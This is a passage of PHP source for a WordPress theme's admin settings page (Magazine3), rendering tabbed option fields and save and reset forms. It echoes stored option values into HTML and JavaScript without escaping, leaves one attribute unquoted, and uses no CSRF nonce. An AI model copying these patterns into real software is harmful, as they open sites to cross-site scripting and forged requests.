	global $shortname, $theme_directory;
	$mmtheme_array = array();
	add_option( 'mmtheme_options', $mmtheme_array );
	$template      = get_option( 'mmtheme_template' );
	$saved_options = get_option( 'mmtheme_options' );
	foreach ( $template as $option ) {
		if ( $option['type'] != 'section' ) {
			$id        = $option['id'];
			$std       = $option['std'];
			$db_option = get_option( $id );
			if ( empty( $db_option ) ) {
				if ( is_array( $option['type'] ) ) {
					foreach ( $option['type'] as $child ) {
						$c_id  = $child['id'];
						$c_std = $child['std'];
						update_option( $c_id, $c_std );
						$mmtheme_array[ $c_id ] = $c_std;
					}
				} else {
					update_option( $id, $std );
					$mmtheme_array[ $id ] = $std;
				}
			} else {
				$mmtheme_array[ $id ] = $db_option;
			}
		}
	}
	update_option( 'mmtheme_options', $mmtheme_array );
}

function mmtheme_theme_admin() {
	global $shortname, $theme_directory;
	$options   = get_option( 'mmtheme_template' );
	$themename = get_option( 'mmtheme_themename' );
	$i         = 0;    ?>
	<link href='http://fonts.googleapis.com/css?family=Droid+Sans' rel='stylesheet' type='text/css'>
	<div id="mm-admin" class="wrap">
<div id="header">

	<script type='text/javascript'
			src='http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.2/jquery-ui.min.js?ver=3.5'></script>
	<script type="text/javascript">
		jQuery(document).ready(function ($) {
			$.fn.delay = function (time, func) {
				return this.each(function () {
					setTimeout(func, time);
				});
			};
			// Slide Fade toggle
			$.fn.slideFadeToggle = function (speed, easing, callback) {
				// nice slide fade toggle animation - pew pew pew
				return this.animate({opacity: 'toggle', height: 'toggle'}, speed, easing, callback);
			}


			activateTabs = {
				init: function () {
					// Activate
					$("#options_tabs").tabs();
					// Append Toggle Button
					// Toggle Tabs
					$('.toggle_tabs').toggle(function () {
						$("#options_tabs").tabs('destroy');
						$(this).addClass('off');
					}, function () {
						$("#options_tabs").tabs();
						$(this).removeClass('off');
					});
				}
			};


			$('.mmtheme_singlecheck :checkbox').iphoneStyle();
			$('#options_tabs .ui-tabs-panel:first').removeClass('ui-tabs-hide');
			activateTabs.init()


			if ($('#mm-admin a.info-icon').size() > 0) {
				$('#mm-admin a.info-icon').hover(
					function () {
						$(this).next().stop(false, true).fadeIn(500);
					},
					function () {
						$(this).next().stop(false, true).fadeOut(500);
					}
				);

			}

		});

	</script>

	<div class="padding" style="float:left;   ">
		<h2>
			Theme Options<br/>
			<span><a href="http://magazine3.com/members" target="_blank">Members Area</a> | <a
					href="http://magazine3.com/help" target="_blank"><span style="color: red;">Need Help?</span></a><a
					href="http://magazine3.com/help" target="_blank"><span style="color: #1D1D1D;"> Click to view Magazine3.com/Help</span></a> </span>
		</h2>
	</div>
	<div style="float: right;margin-right: 10px; margin-top: 15px;position:absolute;left:570px"><a
			href="http://magazine3.com" target="_blank"><img
				src="<?php bloginfo( 'template_directory' ); ?>/includes/mm/images/m3-black.png"/></a></div>
	<div style="clear:both"></div>
</div>
<div id="content_wrap" class="clearfix">
<form method="post" enctype="multipart/form-data">
<div class="info top-info">
	<div class="settingsaved">
		<?php
		// Form results
		if ( isset( $_REQUEST['saved'] ) ) {
			echo '<div id="message" class="updated2 fade"><p><strong>Settings Saved</strong></p></div>';
		}
		if ( isset( $_REQUEST['reset'] ) ) {
			echo '<div id="message" class="updated2 fade"><p><strong>Settings Reset</strong></p></div>';
		}
		?>                    </div>
	<div style="float: right;">
		<input type="submit" name="save" class="button-primary  save-options" value="Save Changes">
	</div>
	<div style="clear: both;"></div>
</div>
<div id="content" class="clearfix">
<div id="options_tabs" class="ui-tabs">
	<ul class="options_tabs ui-tabs-nav">
		<?php foreach ( $options as $value ) {
			switch ( $value['type'] ) {
				case "section":
					$i ++;
					?>
					<li class="ui-state-default ui-corner-top">
						<a href="#option_<?php echo $value['id']; ?>">
							<?php if ( $value['icon'] ) { ?>
								<img
									src="<?php echo $theme_directory ?>mm/files/images/icons/<?php echo $value['icon'] ?>"/>
							<?php } ?>
							<div
								style=" display: inline-block; margin-left: 6px; margin-top: -1px;position: absolute;"><?php echo $value['name']; ?></div>
							<span></span>
						</a>
					</li>
					<?php break;
			}
		}?>
	</ul>
	<?php foreach ($options as $value) {
	switch ($value['type']) {
	// --> open the option section
	case "open":
		?>
		<?php break;
	// --> create a subheadline
	case "subhead":
		?>
		<div class="mmtheme-sub-header">
			<h2> <?php echo $value['name']; ?>
				<div style="float: right;">
					<a href="#" class="info-icon">Description</a>

					<div class="description">
						<div class="inner"><?php echo htmlspecialchars_decode( $value['desc'] ); ?></div>
					</div>
				</div>
			</h2>
		</div>

		<?php break;
	// --> close the option section

	case "subhead2":
		?>
		<div class="mmtheme-sub-header">

			<div style="background:#EFE186;padding: 3px 6px;font-size:12px">
				<b>Please Read:</b>
				Welcome to Magazine3 Seo Options.
				<div style="font-style:italic">We do have in built SEO options that are necessary for users. However,
					this theme also supports WordPress.org's most popular SEO plugins like <b>WordPress SEO by Yoast</b>
					and <b>All in One SEO Pack</b>. If you wish to use those plugins, then Disable the 'Magazine3 SEO'
					from below option.
				</div>
			</div>

		</div>
		<?php break;
	// --> close the option section


	case "subhead3":
		?>
		<div class="mmtheme-sub-header">

			<div style="background:#EFE186;padding: 3px 6px;text-align:center;font-size:12px">
				<b><a target="_blank" href="<?php bloginfo( 'template_directory' ); ?>/images/where-blocks.png"><i>Where
							are these Blocks? -> See this image</i></a></b>

			</div>
		</div>
		<?php break;
	// --> close the option section


	case "subhead5":
		?>
		<div class="mmtheme-sub-header">

			<div style="background:#EFE186;padding: 3px 6px;text-align:center;font-size:12px">
				<b><a target="_blank" href="<?php bloginfo( 'template_directory' ); ?>/images/featured-blocks.png"><i>Where
							are these Featured areas? -> See this image</i></a></b>

			</div>

		</div>
		<?php break;
	// --> close the option section

	case "subhead4":
		?>
		<div class="mmtheme-sub-header">

			<div style="background:#EFE186;padding: 3px 6px;text-align:center;font-size:12px">
				<b><a target="_blank" href="<?php bloginfo( 'template_directory' ); ?>/images/ad-slots.jpg"><i>Where are
							these Advertisement blocks? -> See this image</i></a></b>

			</div>

		</div>
		<?php break;
	// --> close the option section

	case "close": ?>
</div>
<?php break;
case 'slider': ?>
	<div class="mmtheme-option mmtheme-input">
		<div class="section">
			<div class="element optionarea"><h3><?php echo $value['name']; ?></h3>
				<?php
				$std        = $value['std'];
				$option_key = $value['id'];
				$saved      = get_option( $option_key );
				if ( ! $saved ) {
					$saved = $std;
				}
				$show = $saved;
				if ( is_array( $show ) ) {
					$show = implode( '-', $show );
				}
				?>
				<div class="clearfix slide-holder">
					<div id="<?php echo $value['id'] ?>_slider" class="ui-slider"></div>
					<input type="text" id="<?php echo $value['id'] ?>_handle" class="slide-value"
						   value="<?php echo $show ?>">
				</div>
				<input type="hidden" name="<?php echo $value['id'] ?>" id="<?php echo $value['id'] ?>"
					   value="<?php echo $show ?>"/>
				<script type="text/javascript">jQuery("#<?php echo $value['id'] ?>_slider").slider({
						<?php
						if(!is_array($saved)) {
							echo 'value: '.$saved.',';
							echo 'range: "min",';
						} else {
							echo 'range: true,';
							echo 'values: ['.implode(',',$saved).'],';
						}
						echo 'step:' .$value['step'].',';
						echo 'mmtheme: '.$value['mmtheme'].',';
						echo 'min: '.$value['min'].',';
						if(!is_array($saved)) {
							echo 'slide: function(e,ui) { jQuery("#'.$value['id'].'_handle").val(ui.value); jQuery("#'.$value['id'].'").val(ui.value); },';
						} else {
							echo 'slide: function(e,ui) { jQuery("#'.$value['id'].'_handle").val(ui.values[0]+"-"+ui.values[1]); jQuery("#'.$value['id'].'").val(ui.values[0]+"-"+ui.values[1]); },';
						}
					?>
					});
					jQuery("#<?php echo $value['id'] ?>_handle").change(function () {
						if (jQuery(this).val() > <?php echo $value['mmtheme'] ?>) {
							var val = <?php echo $value['mmtheme'] ?>;
							jQuery(this).val(val)
						} else {
							var val = jQuery(this).val();
						}
						jQuery("#<?php echo $value['id'] ?>_slider").slider("value", val);
					});
				</script>
			</div>
		</div>
	</div>
	<?php break;
// --> Create a text input
case 'text':
	?>
	<div class="mmtheme-option mmtheme-input">
		<div class="section">
			<div class="optionarea">
				<div style="float: left;"><h3><?php echo $value['name']; ?></h3></div>
				<div style="float:right">
					<div class="element"><input name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>"
												type="<?php echo $value['type']; ?>"
												value="<?php if ( get_option( $value['id'] ) != "" ) {
													echo stripslashes( get_option( $value['id'] ) );
												} else {
													echo $value['std'];
												} ?>" size="<?php echo $value['size']; ?>"/></div>
				</div>
			</div>
			<div style="clear: both;"></div>
		</div>

	</div>
	<?php break;
// --> Create a textarea input
case 'textarea':
	?>
	<div class="mmtheme-option mmtheme_textarea">
		<div class="section">
			<div class="optionarea">
				<div style="float: left;"><h3><?php echo $value['name']; ?></h3></div>

				<div style="clear: both;"></div>
			</div>
			<div class="element"><textarea name="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>"
										   cols=""
										   rows="<?php echo $value['rows']; ?>"><?php if ( get_option( $value['id'] ) != "" ) {
						echo stripslashes( get_option( $value['id'] ) );
					} else {
						echo $value['std'];
					} ?></textarea></div>

		</div>
	</div>
	<?php
	break;
// --> Create a select input
case 'select':
	?>
	<div class="mmtheme-option mmtheme_select">
		<div class="section">
			<div class="optionarea">
				<div style="float: left;"><h3><?php echo $value['name']; ?></h3></div>
				<div style="float: right;">
					<div class="element">
						<select name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
							<?php foreach ( $value['options'] as $index => $option ) { ?>
								<option value="<?php echo $index ?>" <?php if ( get_option( $value['id'] ) == $index ) {
									echo 'selected="selected"';
								} ?>><?php echo $option; ?></option><?php } ?>
						</select>
					</div>
				</div>
				<div style="clear: both;"></div>
			</div>

		</div>
	</div> <?php
	break;
// --> Create the font Select
case 'font':
	?>
	<div class="mmtheme-option mmtheme_font">
		<div class="section">
			<div class="optionarea">
				<div style="float: left;"><h3><?php echo $value['name']; ?></h3></div>
				<div style="float: right;">
					<div class="element">
						<select name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
							<option value="<?php echo get_option( $value['id'] ) ?>"
									selected="selected"><?php echo get_option( $value['id'] ) ?></option>
							<option value="arial">None (Default Font)</option>
							<?php mmtheme_google_font_select() ?>
						</select>
					</div>
				</div>
				<div style="clear: both;"></div>
			</div>
		</div>
	</div>
	<?php
	break;
// --> Create the Colorpicker
case "colorpicker" :
	?>
	<div class="mmtheme-option option-colorpicker">
		<div class="section">
			<div class="optionarea">
				<div style="float: left;"><h3><?php echo htmlspecialchars_decode( $value['name'] ); ?></h3></div>
				<div style="float: right;">
					<div class="clearfix element">
						<script type="text/javascript">
							jQuery(document).ready(function ($) {
								$('#colorpicker_<?php echo $value['id']; ?>').ColorPicker({
									onSubmit: function (hsb, hex, rgb) {
										$('#colorpicker_<?php echo $value['id']; ?>').val('#' + hex);
									},
									onBeforeShow: function () {
										$(this).ColorPickerSetColor(this.value);
										return false;
									},
									onChange: function (hsb, hex, rgb) {
										$('#cp_<?php echo $value['id']; ?> div').css({
											'backgroundColor': '#' + hex,
											'backgroundImage': 'none',
											'borderColor': '#' + hex
										});
										$('#cp_<?php echo $value['id']; ?>').next('input').attr('value', '#' + hex);
									}
								})
									.bind('keyup', function () {
										$(this).ColorPickerSetColor(this.value);
									});
								$('#cp_<?php echo $value['id']; ?>').next('input').change(function () {
									$('#cp_<?php echo $value['id']; ?> div').css({
										'backgroundColor': $(this).val(),
										'backgroundImage': 'none',
										'borderColor': $(this).val()
									});
								})
							});
						</script>
						<div id="cp_<?php echo $value['id']; ?>" class="cp_box">
							<div class="color_display"
								 style="background-color:<?php echo( get_option( $value['id'] ) != "" ? stripslashes( get_option( $value['id'] ) ) : $value['std'] ) ?>;<?php if ( isset( $value['id'] ) ) {
									 echo 'background-image:none;';
								 } ?>"></div>
						</div>
						<input mmthemelength="7" type="text" name="<?php echo $value['id']; ?>"
							   id="colorpicker_<?php echo $value['id']; ?>"
							   value=<?php if ( get_option( $value['id'] ) != "" ) {
								   echo stripslashes( get_option( $value['id'] ) );
							   } else {
								   echo $value['std'];
							   } ?> class="cp_input"/>
					</div>
				</div>
				<div style="clear: both;"></div>
			</div>
		</div>
	</div>
	<?php
	break;
// --> Create a checkbox
case "checkbox":
	$std        = $value['std'];
	$option_key = $value['id'];
	$saved      = get_option( $option_key );
	if ( isset( $saved ) ) {
		if ( $saved == 'true' ) {
			$checked = 'checked="checked"';
		} else {
			$checked = '';
		}
	} elseif ( $std == 'true' ) {
		$checked = 'checked="checked"';
	} else {
		$checked = '';
	}
	?>
	<div class="mmtheme-option mmtheme_checkbox mmtheme_singlecheck">
		<div class="section">
			<div class="optionarea-onoff">
				<div style="float: left;">
					<h3><?php echo $value['name']; ?></h3></div>
				<div style="float: right;">
					<?php if ( get_option( $value['id'] ) ) {
						$checked = "checked=\"checked\"";
					} else {
						$checked = "";
					} ?>
					<input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>"
						   value="true" <?php echo $checked; ?> />
				</div>
				<div style="clear: both;"></div>
			</div>
		</div>
	</div>
	<?php
	break;
case "multicheck":
	$std = $value['std'];
	?>
	<div class="mmtheme-option mmtheme_checkbox mmtheme_multicheck">
		<h3><?php echo $value['name']; ?></h3>

		<div class="section">
			<div class="element">
				<?php
				$option_key = $value['id'];
				$saved_std  = get_option( $option_key );
				foreach ( $value['options'] as $index => $option ) {
					if ( is_array( $saved_std ) ) {
						if ( in_array( $index, $saved_std ) ) {
							$checked = 'checked="checked"';
						} else {
							$checked = '';
						}
					} elseif ( $std[ $i ] == "true" ) {
						$checked = 'checked="checked"';
					} else {
						$checked = '';
					}        ?>
					<input type="checkbox" class="checkbox" name="<?php echo $option_key ?>[]"
						   id="<?php echo $option_key ?>" value="<?php echo $index ?>" <?php echo $checked ?> />&nbsp;
					<label><?php echo $option ?></label><br/>
					<?php $i ++;
				} ?>    </div>
			<a href="#" class="info-icon">Description</a>

			<div class="description">
				<div class="inner"><?php echo htmlspecialchars_decode( $value['desc'] ); ?></div>
			</div>
		</div>
	</div>
	<?php break;
case "radio": ?>
	<div class="mmtheme-option mmtheme_checkbox mmtheme_multiradio">
		<div class="section">
			<div class="optionarea">
				<div style="float: left;"><h3><?php echo $value['name']; ?></h3></div>
				<div style="float:right">
					<div class="element">    <?php $option_key = $value['id'];
						$saved_std                             = get_option( $option_key ); ?>
						<ul>
							<?php
							foreach ( $value['options'] as $index => $option ) {
								$checked = '';
								if ( $saved_std != '' ) {
									if ( $saved_std == $index ) {
										$checked = ' checked';
									}
								} else {
									if ( $value['std'] == $index ) {
										$checked = ' checked';
									}
								}
								?>
								<li>
									<input type="radio" class="radio overlay_pattern" name="<?php echo $option_key ?>"
										   id="<?php echo $option_key . "_" . $index ?>"
										   value="<?php echo $index ?>" <?php echo $checked ?> />
									<?php if ( $value['addtype'] != "" ) { ?>
										<img
											src="<?php echo $theme_directory ?>files/images/overlay-<?php echo $index ?>.png"
											class="radio-overlay" width="20" height="20"/>
									<?php } ?>
									<label for="<?php echo $option_key . "_" . $index ?>"><?php echo $option ?></label>
								</li>
								<?php $i ++;
							} ?>
						</ul>
					</div>
				</div>
				<div style="clear: both;"></div>
			</div>

		</div>
	</div>
	<?php break;
case "upload": ?>
	<div class="mmtheme-option mmtheme_upload">
		<div class="section">
			<div class="optionarea">
				<div style="float: left;"><h3><?php echo $value['name']; ?></h3></div>
				<div style="clear: both;"></div>
			</div>
			<div class="section">
				<div class="element">
					<?php if ( $img = get_option( $value['id'] . '_value' ) ) { ?>
						<img id="<?php echo $value['id'] ?>_image" src='<?php echo( $img ) ?>'/>            <br/>
						<input type="hidden" value="<?php echo( $img ) ?>" name="<?php echo $value['id'] ?>_value"/>
					<?php } ?>   <input type="file" id="<?php echo $value['id'] ?>_input"
										name="<?php echo $value['id'] ?>" size="40"/>
					<?php if ( $img ) { ?>
						<div><input type="checkbox" value="true" name="<?php echo $value['id'] ?>_delete"
									onclick="jQuery('#<?php echo $value['id'] ?>_image, #<?php echo $value['id'] ?>_input').toggle()"/>
							<span style="font-size: 12px; color: #888; ">Check box and save to delete Image</span>
						</div> <?php } ?>
				</div>
			</div>
		</div>
	</div>
	<?php break;
// --> Create a checkbox
case "socialinput":
	$std = $value['std'];  ?>
	<div class="mmtheme-option mmtheme_checkbox mmtheme_multicheck mmtheme_socialinput">
		<h3><?php echo $value['name']; ?></h3>

		<div class="section">
			<div class="element">
				<ul>
					<?php $option_key = $value['id'];
					$saved_std        = get_option( $option_key );
					foreach ( $value['options'] as $index => $option ) {
						if ( is_array( $saved_std ) ) {
							if ( in_array( $index, $saved_std ) ) {
								$checked = 'checked="checked"';
							} else {
								$checked = '';
							}
						} elseif ( $std[ $i ] == "true" ) {
							$checked = 'checked="checked"';
						} else {
							$checked = '';
						}
						?>
						<li class="clearfix">
							<input type="checkbox" class="checkbox" name="<?php echo $option_key ?>[]"
								   id="<?php echo $option_key ?>" value="<?php echo $index ?>" <?php echo $checked ?> />
							<label><?php echo $option ?></label>
						</li>
						<?php $i ++;
					} ?>
				</ul>
			</div>
		</div>
	</div>
	<?php break;
// --> Create the option section
case "section":
$i ++; ?>
<div id="option_<?php echo $value['id']; ?>"
	 class="block ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
	<input type="hidden" value="<?php echo $value['name']; ?>" name="<?php echo $value['id']; ?>_default">
	<?php break;
	// End switch
	}
	// End foreach
	} ?>
</div>
</div>
<div class="info bottom">
	<input type="submit" name="save" class="button-primary  save-options" value="Save Changes">
	<input type="hidden" name="action" value="save"/>
</div>
<div class="gtranslate">
	<input type="submit" name="save" class="button-primary  save-options" value="Save Changes">
	<input type="hidden" name="action" value="save"/>
</div>
</form>
<form method="post">
	<p class="submit"><span style="color: red;">Attention</span>: Clicking "Restore" button will reset the
		options.<input style="margin:6px 6px 0 0px; background:red;color:#fff;text-shadow:none" name="reset"
					   type="submit" value="Restore Default Options"
					   onclick="return confirm('CAUTION: All settings will be lost! Click OK to reset.');"/><input
			type="hidden" name="action" value="reset"/></p></form>
</div></div><?php } ?>